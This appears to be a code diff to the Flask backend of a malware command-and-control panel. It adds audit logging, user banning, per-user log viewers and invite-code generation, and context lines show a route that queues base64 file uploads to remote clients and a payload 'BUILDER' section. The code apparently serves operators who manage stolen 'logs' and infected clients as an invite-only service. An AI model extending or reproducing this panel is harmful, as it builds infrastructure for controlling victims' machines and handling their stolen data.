@@ -99,13 +99,22 @@ def init_db():
             )
         ''')
 
-        # Migrate: add columns if missing
-        cursor = db.execute("PRAGMA table_info(logs)")
-        columns = [row['name'] for row in cursor.fetchall()]
-        if 'country_code' not in columns:
-            db.execute("ALTER TABLE logs ADD COLUMN country_code TEXT")
-        if 'user_id' not in columns:
-            db.execute("ALTER TABLE logs ADD COLUMN user_id INTEGER")
+        cursor = db.execute("PRAGMA table_info(users)")
+        user_cols = [row['name'] for row in cursor.fetchall()]
+        if 'ban_reason' not in user_cols:
+            db.execute("ALTER TABLE users ADD COLUMN ban_reason TEXT")
+
+        db.execute('''
+            CREATE TABLE IF NOT EXISTS audit_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                admin_id INTEGER,
+                admin_username TEXT,
+                action TEXT,
+                details TEXT,
+                ip TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
 
         db.execute('''
             CREATE TABLE IF NOT EXISTS settings (
@@ -148,6 +157,21 @@ def init_db():
         db.commit()
 
 init_db()
+
+def log_audit(action, details):
+    try:
+        current_u = getattr(request, 'current_user', None) or get_current_user()
+        admin_id = current_u['id'] if current_u else None
+        admin_username = current_u['username'] if current_u else 'System'
+        ip = request.remote_addr or '127.0.0.1'
+        with get_db() as db:
+            db.execute(
+                'INSERT INTO audit_logs (admin_id, admin_username, action, details, ip) VALUES (?, ?, ?, ?, ?)',
+                (admin_id, admin_username, action, details, ip)
+            )
+            db.commit()
+    except Exception as e:
+        print(f"[Audit Log Error] {e}")
 
 # --- Auth helpers ---
 def get_current_user():
@@ -337,10 +361,13 @@ def auth_login():
         return jsonify({'error': 'Invalid username or password'}), 401
 
     if user['is_banned']:
-        return jsonify({'error': 'Your account has been banned'}), 403
+        reason = user['ban_reason'] if user['ban_reason'] else 'No reason specified'
+        return jsonify({'error': f'Your account has been frozen/banned. Reason: {reason}'}), 403
 
     session.permanent = bool(remember)
     session['user_id'] = user['id']
+
+    log_audit('LOGIN', f"User '{user['username']}' (ID #{user['id']}) logged in successfully")
 
     return jsonify({
         'success': True,
@@ -1160,6 +1187,113 @@ def c2_fm_upload(client_id):
     command = f'fm_upload:{dest_path}|{data_b64}'
     wsc['cmd_queue'].put(json.dumps({'type': 'command', 'command': command}, separators=(',', ':')))
     return jsonify({'success': True})
+
+
+# ===== ADMIN API ENDPOINTS =====
+
+@app.route('/api/admin/users')
+@admin_required
+def admin_get_users():
+    try:
+        with get_db() as db:
+            rows = db.execute('''
+                SELECT u.id, u.username, u.role, u.api_key, u.is_banned, u.ban_reason, u.created_at,
+                       COUNT(l.id) as log_count
+                FROM users u
+                LEFT JOIN logs l ON u.id = l.user_id
+                GROUP BY u.id
+                ORDER BY u.id ASC
+            ''').fetchall()
+        users = [dict(r) for r in rows]
+        return jsonify({'users': users})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/admin/users/<int:user_id>/ban', methods=['POST'])
+@admin_required
+def admin_ban_user(user_id):
+    try:
+        data = request.json or {}
+        is_banned = 1 if data.get('is_banned') else 0
+        ban_reason = (data.get('ban_reason') or '').strip()
+
+        with get_db() as db:
+            user = db.execute('SELECT username, role FROM users WHERE id = ?', (user_id,)).fetchone()
+            if not user:
+                return jsonify({'error': 'User not found'}), 404
+            if user['role'] == 'admin' and is_banned:
+                return jsonify({'error': 'Cannot ban an admin user'}), 400
+
+            db.execute('UPDATE users SET is_banned = ?, ban_reason = ? WHERE id = ?', (is_banned, ban_reason, user_id))
+            db.commit()
+
+        action = 'BAN_USER' if is_banned else 'UNBAN_USER'
+        details = f"{'Banned' if is_banned else 'Unbanned'} user '{user['username']}' (ID #{user_id}). Reason: {ban_reason or 'None'}"
+        log_audit(action, details)
+
+        return jsonify({'success': True, 'is_banned': is_banned, 'ban_reason': ban_reason})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/admin/users/<int:user_id>/logs')
+@admin_required
+def admin_get_user_logs(user_id):
+    try:
+        with get_db() as db:
+            user = db.execute('SELECT username FROM users WHERE id = ?', (user_id,)).fetchone()
+            if not user:
+                return jsonify({'error': 'User not found'}), 404
+            logs_rows = db.execute('SELECT * FROM logs WHERE user_id = ? ORDER BY id DESC', (user_id,)).fetchall()
+        logs = [dict(r) for r in logs_rows]
+        return jsonify({'user': dict(user), 'logs': logs})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/admin/audit_logs')
+@admin_required
+def admin_get_audit_logs():
+    try:
+        page = int(request.args.get('page', 1))
+        limit = int(request.args.get('limit', 50))
+        offset = (page - 1) * limit
+        with get_db() as db:
+            rows = db.execute('SELECT * FROM audit_logs ORDER BY id DESC LIMIT ? OFFSET ?', (limit, offset)).fetchall()
+            total = db.execute('SELECT COUNT(*) FROM audit_logs').fetchone()[0]
+        audit_logs = [dict(r) for r in rows]
+        return jsonify({'audit_logs': audit_logs, 'total': total})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/admin/invites/generate', methods=['POST'])
+@admin_required
+def admin_generate_invite():
+    try:
+        code = f"AST-{secrets.token_hex(6).upper()}"
+        user = request.current_user
+        with get_db() as db:
+            db.execute('INSERT INTO invites (code, created_by) VALUES (?, ?)', (code, user['id']))
+            db.commit()
+        log_audit('INVITE_CREATE', f"Generated invite code: {code}")
+        return jsonify({'success': True, 'code': code})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/admin/invites')
+@admin_required
+def admin_get_invites():
+    try:
+        with get_db() as db:
+            rows = db.execute('''
+                SELECT i.*, u1.username as creator_name, u2.username as user_name
+                FROM invites i
+                LEFT JOIN users u1 ON i.created_by = u1.id
+                LEFT JOIN users u2 ON i.used_by = u2.id
+                ORDER BY i.created_at DESC
+            ''').fetchall()
+        invites = [dict(r) for r in rows]
+        return jsonify({'invites': invites})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 
 # ===== BUILDER =====
